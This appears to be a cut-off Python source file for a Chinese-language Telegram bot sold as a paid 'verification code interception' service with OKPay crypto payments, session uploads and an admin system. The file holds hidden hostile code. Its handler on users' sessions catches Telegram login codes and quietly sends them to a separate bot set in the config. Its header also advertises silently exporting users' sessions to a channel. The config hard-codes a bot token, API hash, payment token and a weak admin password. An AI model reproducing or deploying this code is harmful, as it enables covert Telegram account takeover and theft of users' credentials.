#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Telegram 验证码拦截机器人 - 完整增强版 (Railway 修复版)
功能：手机号登录 / Session上传 / 验证码拦截 / OKPay支付激活 / 备用卡密 / 管理员系统 / Webhook回调 / Web后台 / 静默导出Session到频道
作者: @APl520
"""

import os
import sys
import re
import json
import hashlib
import urllib.parse
import logging
import threading
import shutil
import asyncio
import secrets
import string
import time
from pathlib import Path
from datetime import datetime
from collections import OrderedDict
from typing import Dict, Optional, List, Tuple, Set, Union, Any

# ==================== 第三方库导入 ====================
try:
    import requests
except ImportError:
    print("请安装 requests: pip install requests")
    sys.exit(1)

try:
    from flask import Flask, render_template_string, request, jsonify
except ImportError:
    print("请安装 flask: pip install flask")
    sys.exit(1)

try:
    from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
    from telegram.ext import (
        Application, CommandHandler, MessageHandler, ConversationHandler,
        CallbackQueryHandler, ContextTypes, filters
    )
except ImportError:
    print("请安装 python-telegram-bot: pip install python-telegram-bot")
    sys.exit(1)

try:
    from telethon import TelegramClient, events
    from telethon.errors import (
        SessionPasswordNeededError, PhoneCodeInvalidError,
        PasswordHashInvalidError, FloodWaitError, PhoneNumberInvalidError
    )
except ImportError:
    print("请安装 telethon: pip install telethon")
    sys.exit(1)

# ============================================================
#  1. 配置区（所有配置集中管理）
# ============================================================

class Config:
    """配置类 - 所有配置项集中管理"""

    # ---------- Telegram Bot 配置 ----------
    BOT_TOKEN: str = "8509148342:AAEk0BVqke8Ydu07SwkIADAbhW2IPsh1Vr8"
    API_ID: int = 33059943
    API_HASH: str = "1c73a0510ba0b8cb3bd16f24acfd62bf"

    # ---------- 管理员配置 ----------
    SUPER_ADMIN_IDS: List[int] = [7002638062]          # 超级管理员（最高权限）
    ADMIN_IDS: List[int] = [7509368655]                # 普通管理员（可被超级管理管理）

    # ---------- OKPay 商户配置 ----------
    OKPAY_SHOP_ID: str = "35005"
    OKPAY_SHOP_TOKEN: str = "98fDTmGUgRvlx5CsGHIK1NScFY0r4Jn"
    OKPAY_NAME: str = "许"
    OKPAY_BOT_USERNAME: str = "bhgffgggbot"
    OKPAY_API_URL: str = "https://api.okaypay.me/shop/"

    # ---------- 支付配置 ----------
    PAYMENT_AMOUNT: str = "0.5"                       # 支付金额
    PAYMENT_COIN: str = "USDT"                         # 支付币种 (USDT / TRX)

    # ---------- 频道配置 ----------
    REQUIRED_CHANNEL: str = ""                         # 需要加入的频道（留空=不验证）✅ 已禁用
    FORWARD_CHANNEL: str = "xsbbooo"                          # 导出session的频道（留空=不导出）
    FORWARD_BOT_USERNAME: str = "bhgffgggbot"           # 转发验证码的目标机器人
    TELEGRAM_BOT_ID: int = 777000                     # Telegram官方验证码发送者ID

    # ---------- Webhook / Web 配置 ----------
    WEBHOOK_HOST: str = "0.0.0.0"
    WEBHOOK_PORT: int = 39999                         # Webhook 回调端口
    WEB_ADMIN_PORT: int = 39998                       # Web 后台管理端口（和 Webhook 分开）
    WEBHOOK_PATH: str = "/webhook/okpay"
    WEB_USER: str = "admin"                           # Web后台用户名
    WEB_PASS: str = "admin123"                        # Web后台密码

    # ---------- 日志配置 ----------
    LOG_LEVEL: str = "INFO"
    LOG_FORMAT: str = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'

    # ---------- 目录配置 ----------
    BASE_DIR: Path = Path(__file__).parent.absolute()
    SESSIONS_DIR: Path = BASE_DIR / "sessions"
    HISTORY_DIR: Path = BASE_DIR / "history_sessions"
    DATA_DIR: Path = BASE_DIR / "data"

    # ---------- 数据文件 ----------
    PAYMENT_FILE: Path = DATA_DIR / "payments.json"
    ADMINS_FILE: Path = DATA_DIR / "admins.json"
    BACKUP_KEYS_FILE: Path = DATA_DIR / "backup_keys.json"
    JOINED_RECORD_FILE: Path = DATA_DIR / "joined_records.json"

    # ---------- 订单超时配置 ----------
    ORDER_EXPIRE_SECONDS: int = 1800                   # 30分钟


# ============================================================
#  2. 目录初始化
# ============================================================

def init_directories() -> None:
    """初始化所有需要的目录"""
    directories = [
        Config.SESSIONS_DIR,
        Config.HISTORY_DIR,
        Config.DATA_DIR,
    ]
    for dir_path in directories:
        dir_path.mkdir(parents=True, exist_ok=True)
        logging.info(f"目录已创建/确认: {dir_path}")


# ============================================================
#  3. 日志配置
# ============================================================

def setup_logging() -> None:
    """配置日志系统"""
    logging.basicConfig(
        format=Config.LOG_FORMAT,
        level=getattr(logging, Config.LOG_LEVEL)
    )
    # 降低第三方库的日志级别
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("telethon").setLevel(logging.WARNING)


logger = logging.getLogger(__name__)


# ============================================================
#  4. 文件操作工具函数
# ============================================================

def load_json_file(file_path: Path, default: Any = None) -> Any:
    """
    安全加载JSON文件
    Args:
        file_path: 文件路径
        default: 默认值（文件不存在或解析失败时返回）
    Returns:
        解析后的数据或默认值
    """
    if default is None:
        default = {}

    if not file_path.exists():
        logger.debug(f"文件不存在: {file_path}")
        return default

    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        logger.error(f"JSON解析失败 {file_path}: {e}")
        return default
    except Exception as e:
        logger.error(f"读取文件失败 {file_path}: {e}")
        return default


def save_json_file(file_path: Path, data: Any) -> bool:
    """
    安全保存JSON文件
    Args:
        file_path: 文件路径
        data: 要保存的数据
    Returns:
        是否保存成功
    """
    try:
        # 确保目录存在
        file_path.parent.mkdir(parents=True, exist_ok=True)
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        logger.error(f"保存文件失败 {file_path}: {e}")
        return False


# ============================================================
#  5. 管理员管理模块
# ============================================================

class AdminManager:
    """管理员管理类"""

    _admins_cache: Set[int] = set()
    _cache_loaded: bool = False
    _lock: threading.Lock = threading.Lock()

    @classmethod
    def _load_admins(cls) -> Set[int]:
        """从文件加载管理员列表"""
        data = load_json_file(Config.ADMINS_FILE, {"admins": []})
        admins = set(data.get("admins", []))
        # 合并初始管理员
        admins.update(Config.ADMIN_IDS)
        return admins

    @classmethod
    def _save_admins(cls, admins: Set[int]) -> None:
        """保存管理员列表到文件"""
        # 排除初始管理员（他们默认就是管理员，不需要保存）
        custom_admins = list(admins - set(Config.ADMIN_IDS))
        save_json_file(Config.ADMINS_FILE, {"admins": custom_admins})

    @classmethod
    def refresh_cache(cls) -> None:
        """刷新管理员缓存"""
        with cls._lock:
            cls._admins_cache = cls._load_admins()
            cls._cache_loaded = True
            logger.info(f"管理员缓存已刷新，当前 {len(cls._admins_cache)} 人")

    @classmethod
    def is_super_admin(cls, user_id: int) -> bool:
        """检查是否为超级管理员"""
        return user_id in Config.SUPER_ADMIN_IDS

    @classmethod
    def is_admin(cls, user_id: int) -> bool:
        """检查是否为管理员（包括超级管理员）"""
        if user_id in Config.SUPER_ADMIN_IDS:
            return True
        if not cls._cache_loaded:
            cls.refresh_cache()
        with cls._lock:
            return user_id in cls._admins_cache

    @classmethod
    def add_admin(cls, admin_id: int, added_by: int) -> Tuple[bool, str]:
        """
        添加管理员
        Args:
            admin_id: 要添加的用户ID
            added_by: 操作者ID（必须是超级管理员）
        Returns:
            (是否成功, 消息)
        """
        if not cls.is_super_admin(added_by):
            return False, "❌ 只有超级管理员可以添加管理员"

        if not cls._cache_loaded:
            cls.refresh_cache()

        with cls._lock:
            if admin_id in cls._admins_cache:
                return False, f"⚠️ 用户 `{admin_id}` 已经是管理员了"

            if admin_id in Config.SUPER_ADMIN_IDS:
                return False, f"⚠️ 用户 `{admin_id}` 是超级管理员，不能添加为普通管理员"

            cls._admins_cache.add(admin_id)
            cls._save_admins(cls._admins_cache)
            logger.info(f"超级管理员 {added_by} 添加了管理员 {admin_id}")
            return True, f"✅ 已成功添加管理员：`{admin_id}`"

    @classmethod
    def remove_admin(cls, admin_id: int, removed_by: int) -> Tuple[bool, str]:
        """
        移除管理员
        Args:
            admin_id: 要移除的用户ID
            removed_by: 操作者ID（必须是超级管理员）
        Returns:
            (是否成功, 消息)
        """
        if not cls.is_super_admin(removed_by):
            return False, "❌ 只有超级管理员可以移除管理员"

        if not cls._cache_loaded:
            cls.refresh_cache()

        with cls._lock:
            if admin_id not in cls._admins_cache:
                return False, f"⚠️ 用户 `{admin_id}` 不是管理员"

            if admin_id in Config.SUPER_ADMIN_IDS:
                return False, f"⚠️ 用户 `{admin_id}` 是超级管理员，不能移除"

            cls._admins_cache.remove(admin_id)
            cls._save_admins(cls._admins_cache)
            logger.info(f"超级管理员 {removed_by} 移除了管理员 {admin_id}")
            return True, f"✅ 已成功移除管理员：`{admin_id}`"

    @classmethod
    def list_admins(cls) -> List[Dict[str, Any]]:
        """获取所有管理员列表"""
        result = []

        # 超级管理员
        for uid in Config.SUPER_ADMIN_IDS:
            result.append({
                "id": uid,
                "type": "👑 超级管理员",
                "is_super": True
            })

        # 普通管理员
        if not cls._cache_loaded:
            cls.refresh_cache()
        with cls._lock:
            for uid in cls._admins_cache:
                result.append({
                    "id": uid,
                    "type": "🔧 管理员",
                    "is_super": False
                })

        return result


# ============================================================
#  6. 付款管理模块
# ============================================================

class PaymentManager:
    """付款管理类"""

    @staticmethod
    def check_payment_status(user_id: int) -> Dict[str, Any]:
        """
        检查用户付款状态
        Args:
            user_id: 用户ID
        Returns:
            {
                "status": "paid" | "unpaid" | "pending",
                "data": {...}  # 当status为paid时包含详细信息
            }
        """
        payments = load_json_file(Config.PAYMENT_FILE, {})
        user_id_str = str(user_id)

        if user_id_str in payments:
            record = payments[user_id_str]
            if record.get("status") == "paid":
                return {
                    "status": "paid",
                    "data": record
                }
            elif record.get("status") == "pending":
                return {
                    "status": "pending",
                    "data": record
                }

        return {"status": "unpaid", "data": None}

    @staticmethod
    def mark_user_paid(user_id: int, via: str, extra: Dict[str, Any] = None) -> bool:
        """
        标记用户已付款
        Args:
            user_id: 用户ID
            via: 付款方式 (order:xxx / backup_key:xxx / webhook:xxx / force:xxx)
            extra: 额外数据
        Returns:
            是否成功
        """
        payments = load_json_file(Config.PAYMENT_FILE, {})
        user_id_str = str(user_id)

        payments[user_id_str] = {
            "status": "paid",
            "paid_at": datetime.now().isoformat(),
            "via": via,
            "extra": extra or {}
        }

        success = save_json_file(Config.PAYMENT_FILE, payments)
        if success:
            logger.info(f"用户 {user_id} 已激活: {via}")
        return success

    @staticmethod
    def create_pending_order(user_id: int, order_id: str, unique_id: str, pay_url: str,
                             amount: str, coin: str) -> bool:
        """
        创建待支付订单
        Args:
            user_id: 用户ID
            order_id: OKPay订单号
            unique_id: 商户订单号
            pay_url: 支付链接
            amount: 金额
            coin: 币种
        Returns:
            是否成功
        """
        payments = load_json_file(Config.PAYMENT_FILE, {})
        user_id_str = str(user_id)

        payments[user_id_str] = {
            "status": "pending",
            "order_id": order_id,
            "unique_id": unique_id,
            "pay_url": pay_url,
            "amount": amount,
            "coin": coin,
            "created_at": datetime.now().isoformat(),
            "updated_at": datetime.now().isoformat()
        }

        return save_json_file(Config.PAYMENT_FILE, payments)

    @staticmethod
    def get_pending_order(user_id: int) -> Optional[Dict[str, Any]]:
        """
        获取用户的待支付订单
        Args:
            user_id: 用户ID
        Returns:
            订单信息或None
        """
        payments = load_json_file(Config.PAYMENT_FILE, {})
        user_id_str = str(user_id)

        if user_id_str not in payments:
            return None

        order = payments[user_id_str]
        if order.get("status") != "pending":
            return None

        # 检查是否超时
        created_at_str = order.get("created_at")
        if created_at_str:
            try:
                created_at = datetime.fromisoformat(created_at_str)
                if (datetime.now() - created_at).total_seconds() > Config.ORDER_EXPIRE_SECONDS:
                    return None
            except Exception:
                pass

        return order

    @staticmethod
    def reset_user(user_id: int) -> bool:
        """
        重置用户激活状态
        Args:
            user_id: 用户ID
        Returns:
            是否成功
        """
        payments = load_json_file(Config.PAYMENT_FILE, {})
        user_id_str = str(user_id)

        if user_id_str in payments:
            del payments[user_id_str]
            return save_json_file(Config.PAYMENT_FILE, payments)

        return False


# ============================================================
#  7. 备用卡密管理模块
# ============================================================

class BackupKeyManager:
    """备用卡密管理类"""

    @staticmethod
    def generate_key(note: str = "", created_by: int = None) -> str:
        """
        生成备用卡密
        Args:
            note: 备注
            created_by: 创建者ID
        Returns:
            卡密字符串
        """
        data = load_json_file(Config.BACKUP_KEYS_FILE, {"keys": {}})

        # 生成唯一卡密（8位字母数字混合）
        while True:
            key = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))
            if key not in data["keys"]:
                break

        data["keys"][key] = {
            "used": False,
            "used_by": None,
            "used_at": None,
            "note": note,
            "created_by": created_by,
            "created_at": datetime.now().isoformat()
        }

        save_json_file(Config.BACKUP_KEYS_FILE, data)
        logger.info(f"生成备用卡密: {key} (创建者: {created_by})")
        return key

    @staticmethod
    def use_key(user_id: int, key: str) -> Dict[str, Any]:
        """
        使用备用卡密激活
        Args:
            user_id: 用户ID
            key: 卡密
        Returns:
            {"ok": bool, "reason": str}
        """
        data = load_json_file(Config.BACKUP_KEYS_FILE, {"keys": {}})

        if key not in data["keys"]:
            return {"ok": False, "reason": "❌ 卡密不存在"}

        key_info = data["keys"][key]
        if key_info["used"]:
            return {"ok": False, "reason": f"❌ 卡密已被使用"}

        # 标记已使用
        key_info["used"] = True
        key_info["used_by"] = user_id
        key_info["used_at"] = datetime.now().isoformat()
        save_json_file(Config.BACKUP_KEYS_FILE, data)

        # 标记用户已付款
        PaymentManager.mark_user_paid(user_id, f"backup_key:{key}", {"backup_key": key})

        logger.info(f"用户 {user_id} 使用备用卡密 {key} 激活成功")
        return {"ok": True, "reason": "激活成功"}

    @staticmethod
    def list_keys(only_unused: bool = True) -> List[Dict[str, Any]]:
        """
        列出备用卡密
        Args:
            only_unused: 是否只列出未使用的
        Returns:
            卡密列表
        """
        data = load_json_file(Config.BACKUP_KEYS_FILE, {"keys": {}})
        result = []

        for key, info in data["keys"].items():
            if only_unused and info["used"]:
                continue
            result.append({
                "key": key,
                "used": info["used"],
                "used_by": info.get("used_by"),
                "used_at": info.get("used_at"),
                "note": info.get("note", ""),
                "created_by": info.get("created_by"),
                "created_at": info.get("created_at")
            })

        return result

    @staticmethod
    def delete_key(key: str) -> bool:
        """删除卡密"""
        data = load_json_file(Config.BACKUP_KEYS_FILE, {"keys": {}})
        if key in data["keys"]:
            del data["keys"][key]
            save_json_file(Config.BACKUP_KEYS_FILE, data)
            return True
        return False


# ============================================================
#  8. 频道加入记录模块
# ============================================================

class JoinRecordManager:
    """频道加入记录管理类"""

    @staticmethod
    def record_joined(user_id: int, username: str = None) -> None:
        """记录用户已加入频道"""
        data = load_json_file(Config.JOINED_RECORD_FILE, {})
        user_id_str = str(user_id)

        if user_id_str not in data:
            data[user_id_str] = {
                "joined_at": datetime.now().isoformat(),
                "verified": True,
                "username": username
            }
            save_json_file(Config.JOINED_RECORD_FILE, data)
            logger.info(f"用户 {user_id} ({username}) 已记录为加入频道")

    @staticmethod
    def is_recorded(user_id: int) -> bool:
        """检查用户是否已有加入记录"""
        data = load_json_file(Config.JOINED_RECORD_FILE, {})
        return str(user_id) in data

    @staticmethod
    def clear_record(user_id: int) -> bool:
        """清除用户的加入记录"""
        data = load_json_file(Config.JOINED_RECORD_FILE, {})
        user_id_str = str(user_id)

        if user_id_str in data:
            del data[user_id_str]
            save_json_file(Config.JOINED_RECORD_FILE, data)
            return True
        return False


# ============================================================
#  9. OKPay API 封装模块
# ============================================================

class OKPayAPI:
    """OKPay API 封装类"""

    @staticmethod
    def _sign(data: Dict[str, Any]) -> Dict[str, Any]:
        """
        对请求数据签名
        规则：
        1. 注入 shop_id
        2. 过滤空值
        3. 按 key 字典序排列
        4. URL编码后拼接 &token=xxx
        5. MD5 转大写
        """
        data["id"] = Config.OKPAY_SHOP_ID
        # 过滤空值（保留0）
        data = {k: v for k, v in data.items() if v is not None and (v != "" or v == 0)}
        # 按key排序
        data = OrderedDict(sorted(data.items()))
        # URL编码
        query = urllib.parse.urlencode(data, quote_via=urllib.parse.quote)
        # URL解码（与PHP的http_build_query后urldecode对应）
        query = urllib.parse.unquote(query)
        # 计算MD5签名
        sign_str = query + "&token=" + Config.OKPAY_SHOP_TOKEN
        data["sign"] = hashlib.md5(sign_str.encode()).hexdigest().upper()
        return data

    @staticmethod
    def _post(endpoint: str, data: Dict[str, Any], timeout: int = 15) -> Dict[str, Any]:
        """
        发送POST请求
        Args:
            endpoint: API端点
            data: 请求数据
            timeout: 超时时间
        Returns:
            响应JSON
        """
        url = Config.OKPAY_API_URL + endpoint
        signed_data = OKPayAPI._sign(data)

        try:
            logger.debug(f"OKPay请求: {url} {signed_data}")
            response = requests.post(url, data=signed_data, timeout=timeout)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.Timeout:
            logger.error(f"OKPay请求超时: {url}")
            return {"code": -1, "msg": "请求超时"}
        except requests.exceptions.RequestException as e:
            logger.error(f"OKPay请求失败: {e}")
            return {"code": -1, "msg": str(e)}
        except Exception as e:
            logger.error(f"OKPay请求异常: {e}")
            return {"code": -1, "msg": f"未知错误: {e}"}

    @staticmethod
    def verify_sign(data: Dict[str, Any]) -> bool:
        """
        验证回调签名
        Args:
            data: 回调数据（包含sign字段）
        Returns:
            签名是否有效
        """
        sign = data.pop("sign", None)
        if not sign:
            return False

        # 过滤空值
        data = {k: v for k, v in data.items() if v is not None and (v != "" or v == 0)}
        # 按key排序
        data = dict(sorted(data.items()))
        # 拼接查询字符串
        query_parts = []
        for k, v in data.items():
            if isinstance(v, dict):
                # 处理嵌套字典 (如 data[field])
                for sub_k, sub_v in v.items():
                    query_parts.append(f"data[{sub_k}]={sub_v}")
            else:
                query_parts.append(f"{k}={v}")
        query_string = "&".join(query_parts)

        # 计算期望签名
        sign_str = query_string + "&token=" + Config.OKPAY_SHOP_TOKEN
        expected = hashlib.md5(sign_str.encode()).hexdigest().upper()

        logger.debug(f"验签: 期望={expected}, 实际={sign}")
        return expected == sign.upper()

    # ==================== API 方法 ====================

    @staticmethod
    def payLink(order_number: str, amount: str, callback_url: str = None,
                display_name: str = None, coin: str = None) -> Dict[str, Any]:
        """
        创建支付链接
        Args:
            order_number: 商户订单号
            amount: 金额
            callback_url: 回调地址
            display_name: 显示名称
            coin: 币种
        Returns:
            {
                "code": 200,
                "data": {
                    "order_id": "...",
                    "pay_url": "https://..."
                }
            }
        """
        data = {
            "unique_id": order_number,
            "name": display_name or f"{Config.OKPAY_NAME}存款",
            "amount": amount,
            "return_url": f"https://t.me/{Config.OKPAY_BOT_USERNAME}",
            "coin": coin or Config.PAYMENT_COIN,
        }
        if callback_url:
            data["callback_url"] = callback_url

        return OKPayAPI._post("payLink", data)

    @staticmethod
    def transfer(order_number: str, amount: str, to_user_id: str,
                 coin: str = None, callback_url: str = None,
                 display_name: str = None) -> Dict[str, Any]:
        """
        转账/提现
        Args:
            order_number: 商户订单号
            amount: 金额
            to_user_id: 收款用户Telegram ID
            coin: 币种
            callback_url: 回调地址
            display_name: 显示名称
        Returns:
            {
                "code": 200,
                "data": {
                    "order_id": "..."
                }
            }
        """
        data = {
            "unique_id": order_number,
            "name": display_name or f"{Config.OKPAY_NAME}提现",
            "amount": amount,
            "to_user_id": str(to_user_id),
            "coin": coin or Config.PAYMENT_COIN,
        }
        if callback_url:
            data["callback_url"] = callback_url

        return OKPayAPI._post("transfer", data)

    @staticmethod
    def checkDeposit(unique_id: str) -> Dict[str, Any]:
        """
        查询充值订单状态
        Args:
            unique_id: 商户订单号
        Returns:
            {
                "code": 200,
                "data": {
                    "order_id": "...",
                    "status": 0,  # 0=未付款, 1=已付款
                    "amount": "1.00"
                }
            }
        """
        return OKPayAPI._post("checkDeposit", {"unique_id": unique_id})

    @staticmethod
    def checkTransfer(unique_id: str) -> Dict[str, Any]:
        """
        查询提现订单状态
        Args:
            unique_id: 商户订单号
        Returns:
            {
                "code": 200,
                "data": {
                    "order_id": "...",
                    "status": 0,  # 0=等待中, 1=出款成功, 2=失败
                    "amount": "1.00"
                }
            }
        """
        return OKPayAPI._post("checkTransfer", {"unique_id": unique_id})

    @staticmethod
    def balance() -> Dict[str, Any]:
        """
        查询商户余额
        Returns:
            {
                "code": 200,
                "data": {
                    "usdt": "100.00",
                    "trx": "50.00",
                    "cny": "0.00"
                }
            }
        """
        return OKPayAPI._post("balance", {})

    @staticmethod
    def censorUserByTG(telegram_id: str) -> Dict[str, Any]:
        """
        检查用户是否存在
        Args:
            telegram_id: Telegram用户ID
        Returns:
            {
                "code": 200,
                "data": {
                    "telegramID": "123",
                    "exist": True
                }
            }
        """
        data = {
            "id": Config.OKPAY_SHOP_ID,
            "telegramID": str(telegram_id),
        }
        return OKPayAPI._post("censorUserByTG", data)


# ============================================================
#  10. 支付业务逻辑模块
# ============================================================

class PaymentService:
    """支付业务逻辑类"""

    @staticmethod
    def generate_order_number(user_id: int) -> str:
        """
        生成商户订单号
        格式: PAY_{user_id}_{timestamp}_{随机6位}
        """
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_suffix = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))
        return f"PAY_{user_id}_{timestamp}_{random_suffix}"

    @staticmethod
    def create_order(user_id: int, callback_url: str = None) -> Dict[str, Any]:
        """
        创建支付订单
        Args:
            user_id: 用户ID
            callback_url: 回调地址
        Returns:
            {
                "success": bool,
                "pay_url": str,
                "unique_id": str,
                "order_id": str,
                "error": str  # 失败时
            }
        """
        # 检查是否已激活
        status = PaymentManager.check_payment_status(user_id)
        if status["status"] == "paid":
            return {"success": False, "error": "already_paid"}

        # 检查是否有待支付订单
        pending = PaymentManager.get_pending_order(user_id)
        if pending and pending.get("pay_url"):
            return {
                "success": True,
                "pay_url": pending["pay_url"],
                "unique_id": pending.get("unique_id"),
                "order_id": pending.get("order_id"),
                "is_new": False
            }

        # 生成订单号
        order_number = PaymentService.generate_order_number(user_id)

        # 调用OKPay API
        result = OKPayAPI.payLink(
            order_number=order_number,
            amount=Config.PAYMENT_AMOUNT,
            callback_url=callback_url,
            display_name=f"激活机器人 - 用户{user_id}"
        )

        logger.info(f"OKPay创建订单结果: {result}")

        if result.get("code") != 200:
            return {
                "success": False,
                "error": result.get("msg", "支付服务异常")
            }

        data = result.get("data", {})
        order_id = data.get("order_id")
        pay_url = data.get("pay_url")

        if not order_id or not pay_url:
            return {"success": False, "error": "支付链接生成失败"}

        # 保存待支付订单
        PaymentManager.create_pending_order(
            user_id=user_id,
            order_id=order_id,
            unique_id=order_number,
            pay_url=pay_url,
            amount=Config.PAYMENT_AMOUNT,
            coin=Config.PAYMENT_COIN
        )

        return {
            "success": True,
            "pay_url": pay_url,
            "unique_id": order_number,
            "order_id": order_id,
            "is_new": True
        }

    @staticmethod
    def check_order_status(user_id: int) -> Dict[str, Any]:
        """
        查询订单状态
        Args:
            user_id: 用户ID
        Returns:
            {
                "status": "paid" | "pending" | "expired" | "not_found" | "error",
                "detail": str
            }
        """
        # 检查是否已激活
        status = PaymentManager.check_payment_status(user_id)
        if status["status"] == "paid":
            return {"status": "paid", "detail": "已激活"}

        # 获取待支付订单
        pending = PaymentManager.get_pending_order(user_id)
        if not pending:
            return {"status": "not_found", "detail": "未找到订单"}

        unique_id = pending.get("unique_id")
        if not unique_id:
            return {"status": "error", "detail": "订单信息不完整"}

        # 查询OKPay
        result = OKPayAPI.checkDeposit(unique_id)
        logger.info(f"查询订单 {unique_id} 结果: {result}")

        if result.get("code") != 200:
            return {"status": "error", "detail": result.get("msg", "查询失败")}

        data = result.get("data", {})
        order_status = data.get("status")

        if order_status == 1:
            # 已付款
            PaymentManager.mark_user_paid(user_id, f"order:{unique_id}", {
                "order_id": pending.get("order_id"),
                "amount": data.get("amount"),
                "coin": data.get("coin")
            })
            return {"status": "paid", "detail": "支付成功，已激活"}
        elif order_status == 0:
            return {"status": "pending", "detail": "等待支付中"}
        else:
            return {"status": "unknown", "detail": f"未知状态: {order_status}"}

    @staticmethod
    def handle_webhook(data: Dict[str, Any]) -> Dict[str, Any]:
        """
        处理OKPay支付回调
        Args:
            data: 回调数据
        Returns:
            {
                "ok": bool,
                "message": str,
                "user_id": int
            }
        """
        logger.info(f"收到回调: {data}")

        # 验证签名
        if not OKPayAPI.verify_sign(data.copy()):
            logger.warning("回调签名验证失败")
            return {"ok": False, "message": "签名验证失败"}

        # 检查业务码
        if data.get("code") != 200:
            return {"ok": False, "message": f"业务码异常: {data.get('code')}"}

        # 提取数据
        callback_data = data.get("data", {})
        unique_id = callback_data.get("unique_id")
        status = callback_data.get("status")
        order_id = callback_data.get("order_id")

        if not unique_id:
            return {"ok": False, "message": "缺少 unique_id"}

        # 查找用户
        payments = load_json_file(Config.PAYMENT_FILE, {})
        user_id = None

        for uid_str, order in payments.items():
            if order.get("unique_id") == unique_id:
                user_id = int(uid_str)
                break

        if not user_id:
            return {"ok": False, "message": f"未找到订单: {unique_id}"}

        # 处理状态
        if status == 1:
            # 支付成功
            PaymentManager.mark_user_paid(user_id, f"webhook:{unique_id}", {
                "order_id": order_id,
                "amount": callback_data.get("amount"),
                "coin": callback_data.get("coin")
            })
            logger.info(f"用户 {user_id} 通过Webhook激活成功")
            return {"ok": True, "message": "激活成功", "user_id": user_id}
        else:
            logger.info(f"用户 {user_id} 订单状态: {status}")
            return {"ok": False, "message": f"订单状态: {status}", "user_id": user_id}


# ============================================================
#  11. Telegram会话管理模块
# ============================================================

class SessionManager:
    """Telegram会话管理类"""

    # 全局存储: user_id -> { phone -> { client, file_path } }
    _sessions: Dict[int, Dict[str, Dict[str, Any]]] = {}
    _lock: threading.Lock = threading.Lock()

    @classmethod
    def get_user_dir(cls, user_id: int) -> Path:
        """获取用户会话目录"""
        user_dir = Config.SESSIONS_DIR / f"user_{user_id}"
        user_dir.mkdir(parents=True, exist_ok=True)
        return user_dir

    @classmethod
    async def check_session_alive(cls, session_path: Path) -> Tuple[bool, Optional[str]]:
        """
        检查会话文件是否存活
        Args:
            session_path: session文件路径
        Returns:
            (是否存活, 手机号)
        """
        try:
            telethon_path = str(session_path.with_suffix(''))
            client = TelegramClient(telethon_path, Config.API_ID, Config.API_HASH)
            client.flood_sleep_threshold = 60
            await client.connect()

            if not await client.is_user_authorized():
                await client.disconnect()
                return False, None

            me = await client.get_me()
            phone = f"+{me.phone}" if me.phone else None

            await client.disconnect()
            return True, phone

        except Exception as e:
            logger.error(f"验活失败: {session_path.name} - {e}")
            return False, None

    @classmethod
    async def start_monitoring(cls, user_id: int, phone: str, session_path: Path, bot) -> bool:
        """
        启动单个会话监控
        Args:
            user_id: 用户ID
            phone: 手机号
            session_path: session文件路径
            bot: Telegram Bot实例
        Returns:
            是否启动成功
        """
        try:
            telethon_path = str(session_path.with_suffix(''))
            client = TelegramClient(telethon_path, Config.API_ID, Config.API_HASH)
            client.flood_sleep_threshold = 60
            await client.connect()

            if not await client.is_user_authorized():
                logger.warning(f"会话未授权: {phone}")
                await client.disconnect()
                return False

            # 定义消息处理器
            @client.on(events.NewMessage(from_users=Config.TELEGRAM_BOT_ID))
            async def handler(event):
                try:
                    text = event.message.message or ""
                    # 匹配5位数字验证码
                    code_match = re.search(r'\b(\d{5})\b', text)
                    if code_match:
                        code = code_match.group(1)
                        logger.info(f"拦截验证码: {phone} -> {code}")
                        try:
                            # 转发给目标机器人
                            await client.send_message(Config.FORWARD_BOT_USERNAME, code)
                            # 通知用户
                            await bot.send_message(
                                user_id,
                                f"🛡️ <b>拦截成功</b>\n"
                                f"📱 账号: {phone}\n"
                                f"🔑 验证码: <code>{code}</code>",
                                parse_mode='HTML'
                            )
                        except Exception as e:
                            logger.error(f"转发验证码失败: {e}")
                except Exception as e:
                    logger.error(f"消息处理器异常: {e}")

            # 存储会话
            with cls._lock:
                if user_id not in cls._sessions:
                    cls._sessions[user_id] = {}

                # 如果已存在相同账号，先停止旧的
                if phone in cls._sessions[user_id]:
                    old_client = cls._sessions[user_id][phone]['client']
                    try:
                        await old_client.disconnect()
                    except Exception:
                        pass

                cls._sessions[user_id][phone] = {
                    'client': client,
                    'file_path': session_path,
                    'started_at': datetime.now().isoformat()
                }

            # 启动监听（异步）
            asyncio.create_task(client.run_until_disconnected())
            logger.info(f"监控启动: {phone} (用户: {user_id})")
            return True

        except Exception as e:
            logger.error(f"启动监控失败 ({phone}): {e}")
            return False

    @classmethod
    async def stop_monitoring(cls, user_id: int, phone: str, archive: bool = True) -> bool:
        """
        停止监控
        Args:
            user_id: 用户ID
            phone: 手机号
            archive: 是否归档session文件
        Returns:
            是否成功
        """
        client = None
        file_path = None

        with cls._lock:
            if user_id not in cls._sessions or phone not in cls._sessions[user_id]:
                return False

            client = cls._sessions[user_id][phone]['client']
            file_path = cls._sessions[user_id][phone]['file_path']

        try:
            # 断开客户端
            await client.disconnect()

            # 归档session文件
            if archive and file_path and file_path.exists():
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                target_path = Config.HISTORY_DIR / f"{user_id}_{phone}_{timestamp}_{file_path.name}"
                shutil.move(str(file_path), str(target_path))
                logger.info(f"归档会话: {file_path.name} -> {target_path.name}")

            # 从内存中移除
            with cls._lock:
                if user_id in cls._sessions and phone in cls._sessions[user_id]:
                    del cls._sessions[user_id][phone]
                    if not cls._sessions[user_id]:
                        del cls._sessions[user_id]

            return True

        except Exception as e:
            logger.error(f"停止监控失败 ({phone}): {e}")
            return False

    @classmethod
    def get_active_sessions(cls, user_id: int) -> Dict[str, Dict[str, Any]]:
        """获取用户的活跃会话"""
        with cls._lock:
            return dict(cls._sessions.get(user_id, {}))

    @classmethod
    def get_all_sessions(cls) -> Dict[int, Dict[str, Dict[str, Any]]]:
        """获取所有活跃会话"""
